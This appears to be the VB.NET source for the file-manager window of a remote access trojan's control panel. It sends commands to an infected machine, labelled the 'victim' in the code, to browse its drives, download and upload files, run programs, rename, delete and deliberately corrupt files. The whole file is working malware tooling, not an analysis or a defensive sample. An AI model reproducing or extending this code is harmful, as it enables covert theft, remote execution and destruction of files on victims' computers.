Public Class FileManager
    Public Event UploadFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
    Public Event DownloadFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)
    Private Db As New DialogBox
    Sub New(ByVal c As Connection)
        InitializeComponent() : Me.Tag = c
    End Sub

    Private Sub FileManager_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        DirectCast(Me.Tag, Connection).Send("GetDrives|")
    End Sub

    Private Sub UpButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UpButton.Click
        If LocationTextBox.Text.Length < 4 Then
            LocationTextBox.Text = "" : DirectCast(Me.Tag, Connection).Send("GetDrives|")
        Else
            LocationTextBox.Text = LocationTextBox.Text.Substring(0, LocationTextBox.Text.LastIndexOf("\"))
            LocationTextBox.Text = LocationTextBox.Text.Substring(0, LocationTextBox.Text.LastIndexOf("\") + 1)
            DirectCast(Me.Tag, Connection).Send("FileManager|" & LocationTextBox.Text)
        End If
    End Sub

    Private Sub FileManagerListView_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles FileManagerListView.DoubleClick
        If FileManagerListView.FocusedItem.ImageIndex = 0 Or FileManagerListView.FocusedItem.ImageIndex = 1 Or FileManagerListView.FocusedItem.ImageIndex = 2 Then
            If LocationTextBox.Text.Length = 0 Then LocationTextBox.Text += FileManagerListView.FocusedItem.Text Else LocationTextBox.Text += FileManagerListView.FocusedItem.Text & "\"
            DirectCast(Me.Tag, Connection).Send("FileManager|" & LocationTextBox.Text)
        End If
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
        If FileManagerListView.FocusedItem.ImageIndex = 0 Or FileManagerListView.FocusedItem.ImageIndex = 1 Or FileManagerListView.FocusedItem.ImageIndex = 2 Then
            MessageBox.Show("Downloading entire folders are currently not supported.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        Dim sfd As New SaveFileDialog With {.FileName = FileManagerListView.FocusedItem.Text}
        If sfd.ShowDialog = DialogResult.OK Then
            RaiseEvent DownloadFile(DirectCast(Me.Tag, Connection).IPAddress, LocationTextBox.Text & FileManagerListView.FocusedItem.Text, sfd.FileName, FileManagerListView.FocusedItem.Tag.ToString)
        End If
    End Sub

    Private Sub UploadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UploadToolStripMenuItem.Click
        Dim ofd As New OpenFileDialog
        If ofd.ShowDialog = DialogResult.OK Then
            RaiseEvent UploadFile(DirectCast(Me.Tag, Connection).IPAddress, LocationTextBox.Text, ofd.FileName)
        End If
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then
            Select Case FileManagerListView.FocusedItem.ImageIndex
                Case 2
                    DirectCast(Me.Tag, Connection).Send("Rename|Folder|" & LocationTextBox.Text & FileManagerListView.FocusedItem.Text & "|" & Db.inputText)
                Case Else
                    DirectCast(Me.Tag, Connection).Send("Rename|File|" & LocationTextBox.Text & FileManagerListView.FocusedItem.Text & "|" & Db.inputText)
            End Select
        End If
        Delay(1) : DirectCast(Me.Tag, Connection).Send("FileManager|" & LocationTextBox.Text)
    End Sub

    Private Sub ExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExecuteToolStripMenuItem.Click
        If Not FileManagerListView.FocusedItem.ImageIndex = 0 And Not FileManagerListView.FocusedItem.ImageIndex = 1 And Not FileManagerListView.FocusedItem.ImageIndex = 2 And Not FileManagerListView.FocusedItem.ImageIndex = 6 Then
            DirectCast(Me.Tag, Connection).Send("Execute|" & LocationTextBox.Text & FileManagerListView.FocusedItem.Text)
        End If
    End Sub

    Private Sub CorruptToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CorruptToolStripMenuItem.Click
        If Not FileManagerListView.FocusedItem.ImageIndex = 0 And Not FileManagerListView.FocusedItem.ImageIndex = 1 And Not FileManagerListView.FocusedItem.ImageIndex = 2 Then
            DirectCast(Me.Tag, Connection).Send("Corrupt|" & LocationTextBox.Text & FileManagerListView.FocusedItem.Text)
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case FileManagerListView.FocusedItem.ImageIndex
            Case 2
                DirectCast(Me.Tag, Connection).Send("Delete|Folder|" & LocationTextBox.Text & FileManagerListView.FocusedItem.Text)
            Case Else
                DirectCast(Me.Tag, Connection).Send("Delete|File|" & LocationTextBox.Text & FileManagerListView.FocusedItem.Text)
        End Select
        Delay(1) : DirectCast(Me.Tag, Connection).Send("FileManager|" & LocationTextBox.Text)
    End Sub

    Sub Delay(ByVal dblSecs As Double)
        Const OneSec As Double = 1.0# / (1440.0# * 60.0#)
        Dim dblWaitTil As Date
        Now.AddSeconds(OneSec)
        dblWaitTil = Now.AddSeconds(OneSec).AddSeconds(dblSecs)
        Do Until Now > dblWaitTil
            Application.DoEvents()
        Loop
    End Sub

    Private Sub QuickListView_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles QuickListView.DoubleClick
        DirectCast(Me.Tag, Connection).Send("GetSpecialFolders|" & QuickListView.FocusedItem.Text)
    End Sub
End Class